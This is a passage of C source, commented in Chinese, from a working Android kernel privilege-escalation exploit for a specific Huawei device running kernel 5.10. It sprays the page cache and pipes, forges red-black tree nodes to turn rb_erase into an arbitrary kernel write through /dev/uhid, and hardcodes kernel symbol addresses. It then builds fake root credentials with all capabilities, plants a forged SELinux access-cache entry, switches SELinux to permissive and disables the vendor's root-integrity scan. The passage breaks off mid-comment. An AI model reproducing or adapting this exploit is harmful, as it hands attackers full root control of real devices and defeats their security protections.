static int g_hkip = 0;      /* -Y: HKIP 存活实验, 目标 = probe 子进程 (task+0x878 清零) */
static int g_geomdel = 0;   /* -q: 方案2 几何改造(删 ai 之后的 timer); 默认关, 实测会导致 erase 不落地 */

/* 文件 page cache 喷涂: 每 4KB 页都填同一份模板(节点落在页内 g_off)。
 * 实测本机 page cache 写入的页是 GFP_NOFS|__GFP_WRITE / migratetype=0(UNMOVABLE),
 * 与被 discard 的 slab 同一条 free list; 且容量远超 pipe 的 16384 页/uid 硬限额。 */
static int spray_file(const unsigned char *tmpl, int mb)
{
    int fd = open("/data/local/tmp/xiaoyi-pilot/sp.bin", O_CREAT | O_RDWR | O_TRUNC, 0600);
    if (fd < 0) { printf("[!] spray_file open errno=%d(%s)\n", errno, strerror(errno)); return -1; }
    static unsigned char *buf;
    if (!buf) {
        buf = malloc(1u << 20);
        if (!buf) { close(fd); return -1; }
        for (int i = 0; i < 256; i++) memcpy(buf + (size_t)i * 4096, tmpl, 4096);
    }
    long long pages = 0;
    for (int m = 0; m < mb; m++) {
        ssize_t w = write(fd, buf, 1u << 20);
        if (w <= 0) { printf("[!] spray_file write m=%d errno=%d(%s)\n", m, errno, strerror(errno)); break; }
        pages += w / 4096;
    }
    /* 故意不 fsync/不 close: 保持脏页留在 page cache */
    return (int)pages;
}

/* -D 自证(pipe 版): 从 pipe 组的**读端**把喷涂内容读回来, 统计"MARK 被写成 0"的页数。
 * 与 dv_scan 的语义完全一致, 只是采样页来源从 page cache(-F) 换成 pipe page。
 * 只能在 reap 之后调用: read() 会消费 pipe_buffer 并把页归还 buddy。 */
static int *g_pf = NULL;          /* pipe 组: 偶数下标=读端, 奇数=写端 */
static int g_npf = 0;
static int pipe_scan(void)
{
    if (!g_pf || g_npf <= 0) return -1;
    static unsigned char *b;
    if (!b) b = malloc(4096);
    if (!b) return -1;
    long long pages = 0, hit_page = -1;
    int hits = 0, marks = 0, zeros = 0, other = 0;
    for (int i = 0; i < g_npf; i++) {
        int fd = g_pf[i * 2];
        for (;;) {
            ssize_t r = read(fd, b, 4096);
            if (r <= 0) break;
            uint64_t v = 0;
            memcpy(&v, b + g_dvoff, 8);        /* 每个 pipe_buffer 长度 4096, 偏移即页内偏移 */
            if (v == 0x4d41524b4d41524bULL) marks++;          /* 模板原样 */
            else if (v == 0) { zeros++; hits++; if (hit_page < 0) hit_page = pages; }
            else other++;
            pages++;
        }
    }
    printf("[D] pipe 读回 %lld 页: 仍为 MARK 的 %d 页, 已是 0 的 %d 页, 异常 %d 页 "
           "(首处页号=%lld) ⇒ %s\n", pages, marks, zeros, other, hit_page,
           hits ? "内核**确实执行了** *(u64*)left=0 (写原语成立, 只是目标地址选错)"
                : "内核**没有**执行 rb_erase(我们的节点) (树遍历没走到假节点)");
    if (marks == 0 && pages > 0)
        printf("[D2] 注意: 一页 MARK 都没有 → 回读的不是我们喷涂的内容\n");
    return hits;
}

/* -D 自证(page cache 版, 对应 -F): 把 sp.bin 读回来, 统计"MARK 被写成 0"的页数。
 * 这一步不依赖任何目标对象是否正确, 只回答一个问题:
 * reap 之后内核到底有没有执行 rb_erase 的 *(u64*)left = 0? */
static int dv_scan(void)
{
    int fd = open("/data/local/tmp/xiaoyi-pilot/sp.bin", O_RDONLY);
    if (fd < 0) return -1;
    static unsigned char *b;
    if (!b) b = malloc(1u << 20);
    if (!b) { close(fd); return -1; }
    long long pages = 0, hit_page = -1;
    int hits = 0, marks = 0, zeros = 0;
    for (;;) {
        ssize_t r = read(fd, b, 1u << 20);
        if (r <= 0) break;
        for (ssize_t o = 0; o + 4096 <= (ssize_t)r; o += 4096) {
            uint64_t v = 0;
            memcpy(&v, b + o + g_dvoff, 8);
            if (v == 0x4d41524b4d41524bULL) marks++;   /* 模板原样 */
            else if (v == 0) { zeros++; hits++; if (hit_page < 0) hit_page = pages; }
            pages++;
        }
    }
    close(fd);
    printf("[D] 读回 %lld 页: 仍为 MARK 的 %d 页, 已是 0 的 %d 页 (首处页号=%lld) ⇒ %s\n",
           pages, marks, zeros, hit_page,
           hits ? "内核**确实执行了** *(u64*)left=0 (写原语成立, 只是目标地址选错)"
                : "内核**没有**执行 rb_erase(我们的节点) (树遍历没走到假节点)");
    if (marks == 0 && pages > 0)
        printf("[D2] 注意: 一页 MARK 都没有 → 说明目标页并不在本文件里 (读回的不是喷涂内容)\n");
    return hits;
}

/* 连续喷涂用: 保持同一个 fd, 追加写(绝不 O_TRUNC), 这样各段脏页都留在 page cache。 */
static int g_spfd = -1;
static int spray_open(void)
{
    if (g_spfd >= 0) return 0;
    g_spfd = open("/data/local/tmp/xiaoyi-pilot/sp.bin", O_CREAT | O_RDWR | O_TRUNC, 0600);
    if (g_spfd < 0) { printf("[!] spray_open errno=%d(%s)\n", errno, strerror(errno)); return -1; }
    return 0;
}

/* 每轮开始重置喷涂文件: 关闭 + O_TRUNC 重开, 避免连续喷涂跨轮把文件撑到 GB 级。 */
static void spray_reset(void)
{
    if (g_spfd >= 0) { close(g_spfd); g_spfd = -1; }
    (void)spray_open();
}

static int spray_chunk(const unsigned char *tmpl, int mb)
{
    static unsigned char *buf;
    if (!buf) {
        buf = malloc(1u << 20);
        if (!buf) return -1;
        for (int i = 0; i < 256; i++) memcpy(buf + (size_t)i * 4096, tmpl, 4096);
    }
    if (spray_open()) return -1;
    long long pages = 0;
    for (int m = 0; m < mb; m++) {
        ssize_t w = write(g_spfd, buf, 1u << 20);
        if (w <= 0) { printf("[!] spray_chunk errno=%d(%s)\n", errno, strerror(errno)); break; }
        pages += w / 4096;
    }
    return (int)pages;
}

/* 原地重写: 已有的 page cache 页会被直接修改(不重新分配), 用于"先抢页, 后填模板"。 */
static int spray_rewrite(const unsigned char *tmpl, long long pages)
{
    static unsigned char *buf;
    if (!buf) {
        buf = malloc(1u << 20);
        if (!buf) return -1;
        for (int i = 0; i < 256; i++) memcpy(buf + (size_t)i * 4096, tmpl, 4096);
    }
    if (spray_open()) return -1;
    if (lseek(g_spfd, 0, SEEK_SET) < 0) return -1;
    long long done = 0;
    while (done < pages) {
        int chunk = 256;
        if (pages - done < 256) chunk = (int)(pages - done);
        ssize_t w = write(g_spfd, buf, (size_t)chunk * 4096);
        if (w <= 0) break;
        done += w / 4096;
    }
    return (int)done;
}

/* ======================= 方案 B · stage1（misc_list 插入 + AAW 桥）=======================
 * 详见 STAGE1_BRIDGE_DESIGN.md。要点：
 *  - rb_erase 走 Case1(rb_left==0)：parent=pc&~3, *(u64*)(parent+8)=rb_right
 *    ⇒ pc = misc_list-8、rb_right = Pnode  ⇒ *(u64*)misc_list = Pnode
 *  - 收敛：Pnode.rb_left = X(全零) ⇒ rb_next 第 1 轮落到 X，第 2 轮 X 的 pc=0
 *    ⇒ root=0，第 3 轮终止（--sim 已 11/11 验证）
 *  - 副作用 [Pnode] = pc = misc_list-8 → 必须立刻用 fd_P 自改修好（否则脏链）
 *  - 本内核 fops 表存 *.cfi_jt 跳板；owner/open/release 必须为 0
 * ========================================================================= */
/* 以下三个必须是**绝对 link 地址**（运行时再 +slide）：
 *   misc_list                 0xffffffc013547860  (kallsyms)
 *   configfs_read_bin_file.cfi_jt  0xffffffc012242f78
 *   configfs_write_bin_file.cfi_jt 0xffffffc0122489c8
 * 旧值 0x3547860/0x22242f78/0x222489c8 都缺 0xffffffc010000000 基址，
 * 会让 rb_erase 的 parent 指到未映射地址 → panic。已按本机 kallsyms 修正。 */
/* [2026-11-05 修正] 上述"本机 kallsyms"实为旧符号表，全部少了 0x80000；
 * syms_shift.txt 实测真值：misc_list 0xffffffc0135c7860、
 * configfs_read_bin_file.cfi_jt 0xffffffc0122c2f78、
 * configfs_write_bin_file.cfi_jt 0xffffffc0122c89c8。以下常量已统一 +0x80000。 */
#define MISC_LIST_OFF   0xffffffc0135c7860ULL
#define CFI_READ_OFF    0xffffffc0122c2f78ULL   /* configfs_read_bin_file.cfi_jt  */
#define CFI_WRITE_OFF   0xffffffc0122c89c8ULL   /* configfs_write_bin_file.cfi_jt */
#define UHID_MINOR      239
#define SELINUX_STATE_OFF 0xffffffc01394ae68ULL  /* kallsyms: selinux_state (enforcing @ +0) */
#define SELINUX_AVC_OFF   0xffffffc013946e20ULL  /* kallsyms: selinux_avc (slot0 在 +8，hash 槽 8B/个) */
#define INIT_CRED_OFF   0xffffffc013198ae0ULL    /* kallsyms: init_cred (security blob = kernel sid) */
#define TASK_CRED_OFF   0xa48ULL
#define TASK_RCRED_OFF  0xa40ULL
#define TASK_COMM_OFF   0xa58ULL
/* -U FCIMPX 激活用: 关华为周期根扫描 + 关 SELinux(只写 .data, 不碰代码段/hooks)
 * g_rscan_skip_flag: int[6] = {kcode, syscall, se_hooks, se_status, rprocs, setid}
 * selinux_state: enforcing @+0 或 +1(取决于 CONFIG_SECURITY_SELINUX_DISABLE)，两字节都清 0 最稳 */
#define RSKIP_OFF       0xffffffc01394e78cULL
#define SELSTATE_OFF    0xffffffc01394ae68ULL
/* 方案二（伪 cred）用到的全局符号，均为 kallsyms 里的**绝对 link 地址**，运行时再 +slide */
#define SIG_ENFORCE_OFF    0xffffffc01352d468ULL  /* sig_enforce（8B 清零不越界） */
#define INIT_USER_NS_OFF   0xffffffc013197528ULL  /* init_user_ns */
#define ROOT_USER_OFF      0xffffffc013197770ULL  /* root_user */
#define INIT_GROUPS_OFF    0xffffffc013198b88ULL  /* init_groups */

static int      g_insert = 0;        /* -I: stage1 插入模式 */
static uint64_t g_ins_bootid = 0;    /* -B <link偏移>: 桥建成后写 sysctl_bootid 自证 */
static const char *g_ucmd = NULL;    /* -U <cmd>: 桥建成后把 probe 子进程 root 化并执行命令 */
static const char *g_uexec = NULL;   /* probe 实际 exec 的命令(AAWL:<cmd> 时是 ':' 之后的部分) */
static int g_uexec_direct = 0;       /* 1=AAWX: 直接 execve(path)，不经 /system/bin/sh（避免 fork/引号） */
static int g_caproot = 0;            /* -Q <cmd>: 不换 cred 指针, 直接把自身 cred 的 ids 清零 + caps 拉满 */
static int      g_ins_fdP = -1, g_ins_fdQ = -1;   /* AAW 桥的两个 fd */
static int      g_wake_fd[2] = { -1, -1 };        /* -U: 父→probe 的放行管道 */
static int      g_sel_fd[2] = { -1, -1 };         /* -U: probe→父 的自检输出管道
                                                   * kernel 域写 shell_data_file 会被 SELinux 拒,
                                                   * 但写 pipe 不需要文件权限, 故自检输出走 pipe */
static uint64_t g_ins_page, g_ins_p, g_ins_q, g_ins_x, g_ins_f, g_ins_pnode;

/* 方案二: -U FAKECRED。把 probe 的 cred 指到喷涂页里的伪 cred，靠 AAW 扫 sid 切 init 域 */
static int      g_fakecred = 0;
static int      g_fcdiag   = 0;   /* -U FCDIAG：一发多测（T0 对照/T1 delete_module/T2 垃圾 init_module/T3 真模块） */
static int      g_fcimp    = 0;   /* -U FCIMP：唤醒即刻 init_module（探针唤醒后约 2s 被静默清理） */
static int      g_fcput    = 0;   /* -U FCPUT：唤醒即刻把模块写入 /data/misc（由合法 init relay 再 insmod） */
static int      g_aawl     = 0;   /* -U AAWL：桥建好后常驻命令循环，接受 /data/local/tmp/aawl.cmd 的任意写 */
static uint64_t g_fc_va = 0, g_tsec_va = 0;   /* 伪 cred / 伪 task_security_struct 的运行时地址 */
static uint64_t g_avc_node_va = 0;            /* 伪 avc_node（喷涂页内），用于放行 module_load */
static const char *g_modpath = "/data/local/tmp/kk.ko";
static int      g_act       = 0;   /* -U FCIMPX：先写巡检跳过位+SELinux，再装修复模块，成功后 exec 常驻通道 */
static const char *g_actcmd = "/data/local/tmp/act.sh";
static const char *g_shellcmd = NULL;   /* -U SHELL:<cmd>：模块加载成功后 probe 直接 sh -c <cmd>（验证 KSU 提权是否生效） */
static const char *g_daemon = NULL;     /* -U DAEMONX:<name>：probe 以 uid0+域常驻，监听抽象 unix socket @<name>，内建命令自执行 */
static int      g_fcfork    = 0;   /* -U FCFORK: 拿伪 root 后立刻 fork 子进程（不 exec）逃逸 */
static int      g_reload    = 0;   /* -U RELOAD: fork 子进程内 unload 旧实例并以 allow_shell=1 重载 */
static int      g_panic     = 0;   /* -U FCFORKPANIC: 模块加载后主动 panic，把完整 printk 环落 pstore */
static int      g_nomod     = 0;   /* -U SHELLX:<cmd>：不加载模块（模块已就绪或无需），换域后直接 sh -c <cmd> */
static int      g_ksuinst   = 0;   /* -U FCFORKKSU: fork 逃逸子进程内直接装 ksud（不 exec, init 域无 shell_exec） */

static void ins_put64(unsigned char *t, int o, uint64_t v) { *(uint64_t *)(t + o) = v; }
static void ins_put32(unsigned char *t, int o, uint32_t v) { *(uint32_t *)(t + o) = v; }

static void build_ins_tmpl(unsigned char *tmpl, int off)
{
    uint64_t slide = slide_eff();
    uint64_t misc  = MISC_LIST_OFF + slide;
    uint64_t page  = g_node_va & ~0xfffULL;
    /* 辅助区必须避开被 erase 的节点 [off, off+0x18)，两块区互斥即可保证 */
    int A = 0x400;
    if (off >= 0x3E0 && off < 0x760) A = 0x800;
    if (off >= 0x7E0 && off < 0xB60) A = 0x400;
    uint64_t P = page + A, X = page + A + 0x120, Q = page + A + 0x180, F = page + A + 0x240;
    g_ins_page = page; g_ins_p = P; g_ins_x = X; g_ins_q = Q; g_ins_f = F;
    g_ins_pnode = P + 0x18;
    g_target = g_ins_pnode;

    /* L：被 erase 的假节点。-d 模式把写入目标/值换成调用方给的 (tgt-8|1, val)：
     * rb_erase Case1 → parent=pc&~3=tgt-8 → *(parent+8)=*(tgt)=rb_right=val
     * 低位必须置 1(red)：__rb_is_black(pc) 为假 ⇒ rebalance=NULL，不会拿
     * tgt-8 处的真实数据当红黑节点做重平衡（写 0 时 rb_right=0 必走此分支） */
    uint64_t wpc = (g_gtgt && !g_dverify) ? ((g_gtgt - 8) | 1ULL) : (misc - 8);
    uint64_t wrv = (g_gtgt && !g_dverify) ? g_gval : g_ins_pnode;
    ins_put64(tmpl, off,        wpc);           /* __rb_parent_color = 写入目标-8 */
    ins_put64(tmpl, off + 8,    wrv);           /* rb_right = 插入值 */
    ins_put64(tmpl, off + 0x10, 0);             /* rb_left = 0 → Case 1 */

    /* P（engine 记录，bin_buffer 先自指） */
    ins_put32(tmpl, A + 0x00, UHID_MINOR);
    ins_put64(tmpl, A + 0x10, F);
    ins_put64(tmpl, A + 0x18, g_puresh ? misc : 0);  /* 纯 shell: 闭合回 &misc_list → /proc/misc 可安全遍历 */
    ins_put64(tmpl, A + 0x20, 0);
    ins_put64(tmpl, A + 0x28, X);               /* node.rb_left → 收敛锚点 */
    ins_put64(tmpl, A + 0x30, 0);               /* node.rb_right */
    ins_put64(tmpl, A + 0x70, P);               /* bin_buffer = 自己 */
    ins_put32(tmpl, A + 0x78, 0x1000);          /* bin_buffer_size */
    ins_put32(tmpl, A + 0x7c, 0x1000);          /* cb_max_size（5.10 必须非 0） */

    /* Q（door 记录，bin_buffer 由 P 改写） */
    ins_put32(tmpl, A + 0x180, UHID_MINOR);
    ins_put64(tmpl, A + 0x190, F);
    ins_put64(tmpl, A + 0x198, misc);           /* list.next = head */
    ins_put64(tmpl, A + 0x1f0, Q);
    ins_put32(tmpl, A + 0x1f8, 0x1000);
    ins_put32(tmpl, A + 0x1fc, 0x1000);

    /* F（伪 file_operations） */
    ins_put64(tmpl, A + 0x240 + 0x00, 0);                          /* owner = 0 */
    ins_put64(tmpl, A + 0x240 + 0x10, slide + CFI_READ_OFF);
    ins_put64(tmpl, A + 0x240 + 0x18, slide + CFI_WRITE_OFF);
    ins_put64(tmpl, A + 0x240 + 0x70, 0);                          /* open = 0 */
    ins_put64(tmpl, A + 0x240 + 0x80, 0);                          /* release = 0 */

    /* 方案二：伪 cred。整页模板本来就是全 0，这里只填非零字段。
     * 放在不与 node [off,off+0x18) 也不与 aux [A,A+0x300) 重叠的 0xE0 空闲块里。
     * cred 布局（CONFIG_DEBUG_CREDENTIALS 未开）：
     *   +0x00 usage  +0x04..+0x20 uid/gid/suid/sgid/euid/egid/fsuid/fsgid
     *   +0x24 securebits  +0x28..+0x48 五个 caps  +0x78 security
     *   +0x80 user  +0x88 user_ns  +0x90 group_info
     * tsec 紧跟在 cred 之后（+0xC0），sid 字段在 +0x04，由父进程 AAW 扫描时逐轮改写。 */
    g_fc_va = 0; g_tsec_va = 0; g_avc_node_va = 0;
    if (g_fakecred) {
        static const int cand[7] = { 0x100, 0x300, 0x500, 0x700, 0x900, 0xb00, 0xd00 };
        int fco = -1;
        for (int i = 0; i < 7; i++) {
            int c = cand[i], e = cand[i] + 0xE0;
            int ov_node = (c < off + 0x18 && off < e);
            int ov_aux  = (c < A + 0x300 && A < e);
            if (!ov_node && !ov_aux) { fco = c; break; }
        }
        if (fco < 0) {
            printf("[B12F] 无 0xE0 空闲块可放伪 cred (off=%#x aux=%#x)\n", off, A);
        } else {
            uint64_t FC = page + fco, TS = FC + 0xC0;
            uint64_t caps = 0x1ffffffffffULL;
            g_fc_va = FC; g_tsec_va = TS;
            ins_put32(tmpl, fco + 0x00, 0x40000000);   /* usage 巨大：put_cred 永不归零，绝不释放 */
            ins_put64(tmpl, fco + 0x28, caps);         /* cap_inheritable */
            ins_put64(tmpl, fco + 0x30, caps);         /* cap_permitted   */
            ins_put64(tmpl, fco + 0x38, caps);         /* cap_effective   */
            ins_put64(tmpl, fco + 0x40, caps);         /* cap_bset        */
            ins_put64(tmpl, fco + 0x48, caps);         /* cap_ambient     */
            ins_put64(tmpl, fco + 0x78, TS);           /* security -> 伪 tsec */
            ins_put64(tmpl, fco + 0x80, ROOT_USER_OFF   + slide);
            ins_put64(tmpl, fco + 0x88, INIT_USER_NS_OFF + slide);
            ins_put64(tmpl, fco + 0x90, INIT_GROUPS_OFF + slide);
            printf("[B12F] 伪 cred @ %#llx (page+%#x) tsec @ %#llx (sid 初值 0, 待 AAW 扫描)\n",
                   (unsigned long long)FC, fco, (unsigned long long)TS);
        }
    }

    /* 伪 avc_node：放在与 node/aux/伪 cred 都不重叠的固定空档。
     * probe 调 init_module 时 avc_lookup 按 (sid,sid,system) 哈希命中本节点，
     * 直接把 module_load 判为 allowed（否则该规则在策略里不存在，任何 sid 都 EACCES）。
     * 布局：ssid@0 / tsid@4 / tclass@8(u16) / avd.allowed@0xc / xp_node@0x20 / list@0x28。
     * ssid 在父进程命中 sid 后由 AAW 补写。 */
    if (g_fakecred) {
        static const int acand[3] = { 0x1F0, 0x9F0, 0xBF0 };
        int cf = g_fc_va ? (int)(g_fc_va - page) : -1;
        int aco = -1;
        for (int i = 0; i < 3; i++) {
            int c = acand[i], e = c + 0x48;
            if (e > 4096) continue;
            int ov_node = (c < off + 0x18 && off < e);
            int ov_aux  = (c < A + 0x300 && A < e);
            int ov_cred = (cf >= 0 && c < cf + 0xE0 && cf < e);
            if (!ov_node && !ov_aux && !ov_cred) { aco = c; break; }
        }
        if (aco < 0) {
            printf("[B12A] 无 0x48 空档放伪 avc_node (off=%#x aux=%#x)\n", off, A);
        } else {
            g_avc_node_va = page + aco;
            ins_put64(tmpl, aco + 0x08, 0xFFFFFFFF00000004ULL);  /* tclass=4; avd.allowed=all */
            printf("[B12A] 伪 avc_node @ %#llx (page+%#x)\n",
                   (unsigned long long)g_avc_node_va, aco);
        }
    }

    /* [修复-层1] 整页自洽：同页共 15 个 272B 的 timer 槽位，清理路径在遍历 timer 树时
     * 可能碰到本页上除主节点之外的其它槽位；若这些槽位是全 0（parent=NULL），rb_erase
     * 会把该节点当根节点，向 NULL 写 root → oops。这里把每个非保护槽位都写成与主节点
     * 等价的“安全自环”(parent=(misc-8)|1, rb_right=Pnode, rb_left=0)，使多次 erase 退化
     * 为同一次幂等写，而不是踩空。WHOLEPAGE=0 可关闭以做 A/B 对照。 */
    int wp_slots = 0, wp_skip = 0;
    if (!getenv("WHOLEPAGE") || atoi(getenv("WHOLEPAGE")) != 0) {
        int fc_off = g_fc_va ? (int)(g_fc_va - page) : -1;
        int av_off = g_avc_node_va ? (int)(g_avc_node_va - page) : -1;
        for (int s = 0; s + 0x18 <= 4096; s += 0x110) {
            int skip = 0;
            if (s < off + 0x18 && off < s + 0x18) skip = 1;                 /* 主节点槽 */
            if (s < A + 0x300     && A   < s + 0x18) skip = 1;              /* aux 区 */
            if (fc_off >= 0 && s < fc_off + 0xE0 && fc_off < s + 0x18) skip = 1;
            if (av_off >= 0 && s < av_off + 0x48 && av_off < s + 0x18) skip = 1;
            if (skip) { wp_skip++; continue; }
            ins_put64(tmpl, s,        wpc);
            ins_put64(tmpl, s + 0x08, wrv);
            ins_put64(tmpl, s + 0x10, 0);
            wp_slots++;
        }
    }
    printf("[B12T] 整页自洽 slots=%d skip=%d (每槽 parent=(misc-8)|1 right=Pnode left=0)\n",
           wp_slots, wp_skip);
    /* [修复-层3] 抢页前置校验：仅在启用整页自洽（WHOLEPAGE!=0）时要求槽位覆盖足够，
     * 否则放弃本次开盘（不 kill、不 reap），避免拿未初始化的页喂内核清理路径。
     * WHOLEPAGE=0 属于 A/B 对照组，本来就只有 4 点模板，不适用该闸。 */
    if (wp_slots < 8 && (!getenv("WHOLEPAGE") || atoi(getenv("WHOLEPAGE")) != 0)) {
        printf("[B12T] 槽位覆盖不足 (%d<8) → 放弃本次开盘\n", wp_slots);
        fflush(stdout);
        for (;;) sleep(3600);
    }

    printf("[B12I] 插入模板 off=%#x aux=%#x P=%#llx Pnode=%#llx Q=%#llx F=%#llx "
           "misc_list=%#llx (slide=%#llx)\n",
           off, A, (unsigned long long)P, (unsigned long long)g_ins_pnode,
           (unsigned long long)Q, (unsigned long long)F,
           (unsigned long long)misc, (unsigned long long)slide);
}

/* 纯 shell 用：空洞页的"安全节点网格"。rb_right 统一指向公共桥页的 Pnode，
 * 这样无论 victim 实际吃的是哪一对空洞、哪个对象槽，rb_erase 都把 misc_list
 * 写成同一个地址，ins_bridge 的绝对地址就与"用了哪一对/哪个槽"无关。
 * 8KB 块 = 两块 4KB：head 页对象槽 node 在 0x88+k*0x110，tail 页在 0x78+k*0x110
 * （对象 29 的 node = 0x1F58 → tail 页 0xF58，与历史泄漏一致）。 */
static void ps_grid(unsigned char *t, int start, uint64_t wrv, int sk_lo, int sk_hi)
{
    uint64_t slide = slide_eff();
    uint64_t misc  = MISC_LIST_OFF + slide;
    uint64_t wpc   = (g_gtgt && !g_dverify) ? ((g_gtgt - 8) | 1ULL) : (misc - 8);
    for (int off = start; off + 0x18 <= 4096; off += 0x110) {
        if (sk_hi > sk_lo && off < sk_hi && sk_lo < off + 0x18) continue;
        ins_put64(t, off,        wpc);
        ins_put64(t, off + 0x08, wrv);
        ins_put64(t, off + 0x10, 0);
    }
}

/* 纯 shell GATE：喷 page-cache 页，用 filemap add 事件找"被我们抢回的空洞页对"，
 * 再给这两页分别回填该 pfn 自己的插入模板。成功即 GATE=PASS（不需要 kmem）。
 * 预测被遍历节点 = 8KB 块 tail 页 off=0xf58（第 30 个对象 29*0x110+0x88）。 */
static int ps_gate_run(void)
{
    /* 新链路：模板已在 ps_make_holes 里预置进空洞页（fadvise 之前），这里只做验证：
     * ① 喷涂 page-cache 测量还有哪些空洞页对是空闲的（没被 victim slab 吃掉）；
     * ② 打印 posix_timers_cache slab 计数，确认 slab 增长。
     * 返回"仍空闲的空洞对数"；0 = 全部空洞已被占用（victim slab 落在洞里）。 */
    int fd = open(PS_SPRAY_FILE, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { printf("[PS] 喷涂文件 open: %s\n", strerror(errno)); return -1; }
    static unsigned char z[4096];
    memset(z, 0, sizeof z);
    wr_rc(TRACE_DIR "/trace", "\n");
    int npages = 16384, wrote = 0;
    for (int i = 0; i < npages; i++)
        if (pwrite(fd, z, 4096, (off_t)i * 4096) == 4096) wrote++;
        else break;
    struct stat st;
    if (fstat(fd, &st) != 0) { close(fd); return -1; }
    char ino[32];
    snprintf(ino, sizeof ino, "%llx", (unsigned long long)st.st_ino);
    static struct psadd adds[16384];
    int na = ps_scan_adds(ino, adds, 16384);
    printf("[PS] 喷涂 ino=%s wrote=%d add=%d\n", ino, wrote, na);
    int nfree = 0;
    int nocc = 0;
    uint64_t occH = 0;
    for (int i = 0; i < g_ps_nhole; i++) {
        uint64_t H = g_ps_hole[i];
        int f0 = 0, f1 = 0;
        for (int k = 0; k < na; k++) {
            if (adds[k].pfn == H) f0 = 1;
            else if (adds[k].pfn == H + 1) f1 = 1;
        }
        if (f0 || f1) nfree++;
        else { nocc++; occH = H; printf("[PS] 被占用 pair[%d] pfn=%llu,%llu\n",
                                        i, (unsigned long long)H, (unsigned long long)(H + 1)); }
    }
    printf("[PS] 空洞仍空闲=%d/%d（已被占用=%d 对）\n", nfree, g_ps_nhole, nocc);
    printf("[PS] slab %s\n", ps_slab_pt());
    close(fd);
    unlink(PS_SPRAY_FILE);
    if (getenv("PSPARK")) return nfree;      /* 验证模式：交给 P11 打印后正常退出 */
    if (nocc != 1) {
        printf("[PS] 被占用空洞对=%d（需恰好 1 对）→ 不 reap\n", nocc);
        return -1;
    }
    /* 精确节点地址：命中的那对空洞头页 + 0xF58（8KB 块内第 29 个对象的 rb_node） */
    g_node_pfn = occH;
    g_node_va = PAGE_OFFSET + occH * 4096ULL + 0xF58ULL;
    printf("[PS] 唯一命中: pfn=%llu node=%#llx (模板已在该页预置)\n",
           (unsigned long long)occH, (unsigned long long)g_node_va);
    return 0;
}

/* 桥三步：open→(命中 P)→自改修复→open(命中 Q)→arm+write */
static int ins_bridge(void)
{
    unsigned char blob[0x80], arm[0x10], v8[8];
    ssize_t w;
    int fd1 = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    printf("[B20] open /dev/uhid -> %d (errno=%d %s)\n", fd1, errno, strerror(errno));
    if (fd1 < 0) return -1;
    g_ins_fdP = fd1;

    /* ① 自改：P.minor=0（让下一次遍历跳过 P）、P.list.next=Qnode、P.bin_buffer=Q */
    memset(blob, 0, sizeof blob);
    ins_put32(blob, 0x00, 0);
    ins_put64(blob, 0x18, g_ins_q + 0x18);
    ins_put64(blob, 0x70, g_ins_q);
    ins_put32(blob, 0x78, 0x1000);
    ins_put32(blob, 0x7c, 0x1000);
    errno = 0;
    w = pwrite(fd1, blob, sizeof blob, 0);
    printf("[B21] repair pwrite=%zd errno=%d (%s) (expect %zu)\n",
           w, errno, strerror(errno), sizeof blob);
    if (w != (ssize_t)sizeof blob) return -2;

    /* ② 第二次 open 应命中 Q */
    int fd2 = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    printf("[B22] open2 /dev/uhid -> %d (errno=%d %s)\n", fd2, errno, strerror(errno));
    if (fd2 < 0) return -3;
    g_ins_fdQ = fd2;

    /* ③ 自证：写 sysctl_bootid（无害全局，失败也不崩） */
    if (g_ins_bootid) {
        uint64_t t = 0xffffffc010000000ULL + slide_eff() + g_ins_bootid;
        char before[64] = { 0 }, after[64] = { 0 };
        int bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
        if (bf >= 0) { if (read(bf, before, sizeof before - 1) <= 0) {} close(bf); }
        memset(arm, 0, sizeof arm);
        ins_put64(arm, 0, t);
        ins_put32(arm, 8, 8);
        ins_put32(arm, 12, 8);
        w = pwrite(fd1, arm, sizeof arm, 0x70);          /* 改 Q.bin_buffer = t */
        printf("[B23] arm pwrite=%zd target=%#llx\n", w, (unsigned long long)t);
        if (w != (ssize_t)sizeof arm) return -4;
        memset(v8, 0, sizeof v8);
        w = pwrite(fd2, v8, 8, 0);                        /* 8 字节 0 → boot_id */
        printf("[B23] write64 pwrite=%zd (expect 8)\n", w);
        usleep(20000);
        int af = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
        if (af >= 0) { if (read(af, after, sizeof after - 1) <= 0) {} close(af); }
        printf("[B24] boot_id before='%s' after='%s'\n",
               before[0] ? before : "?", after[0] ? after : "?");
        if (strstr(after, "00000000-0000-0000-")) {
            printf("== VERDICT: STAGE1 AAW OK (boot_id 前 8 字节已被清零 ⇒ 任意写成立)\n");
            return 0;
        }
        printf("== VERDICT: STAGE1 AAW NO EFFECT (write 返回到达但目标未变)\n");
        return -5;
    }
    printf("== VERDICT: STAGE1 桥就绪 (fd*2 命中，未做自证; 用 -B 38db614 验证)\n");
    return 0;
}

/* ---------- AAW 写原语（桥建成后可用）----------
 * configfs_buffer 布局(本机 5.10.43 实测): 0x68 needs_read_fill / 0x6c read_in_progress
 * / 0x6d write_in_progress / 0x70 bin_buffer / 0x78 bin_buffer_size / 0x7c cb_max_size。
 * arm 从 0x68 写 0x18 字节：清掉两个 in_progress 标志 + 指向目标 + 设长度。
 * 注: AAR(任意读)走不通——configfs_read_bin_file 开头 to_frag() 会读 dentry->d_fsdata，
 *     本桥的 fd 不是 configfs dentry，d_fsdata=NULL → +0x50 NULL deref（a17c 实测），故只保留写。 */
static int aaw_arm(uint64_t target, int len)
{
    unsigned char arm[0x18];
    if (g_ins_fdP < 0 || g_ins_fdQ < 0) return -1;
    memset(arm, 0, sizeof arm);
    ins_put64(arm, 0x08, target);       /* 0x70 bin_buffer */
    ins_put32(arm, 0x10, (uint32_t)len);/* 0x78 bin_buffer_size */
    ins_put32(arm, 0x14, (uint32_t)len);/* 0x7c cb_max_size */
    if (pwrite(g_ins_fdP, arm, sizeof arm, 0x68) != (ssize_t)sizeof arm) return -2;
    return 0;
}

static int aaw_write(uint64_t target, const void *data, int len)
{
    int r = aaw_arm(target, len);
    if (r) return r;
    if (pwrite(g_ins_fdQ, data, len, 0) != (ssize_t)len) return -3;
    return 0;
}

static int aaw_write64(uint64_t target, uint64_t val)
{
    return aaw_write(target, &val, 8);
}

/* -U FCIMPX: 让华为周期根扫描(hw_root_scan -> STP -> TEE)永远报 clean，
 * 并把 SELinux 切到 permissive。全程只写 .data，不改 security_hook_heads、不改代码段，
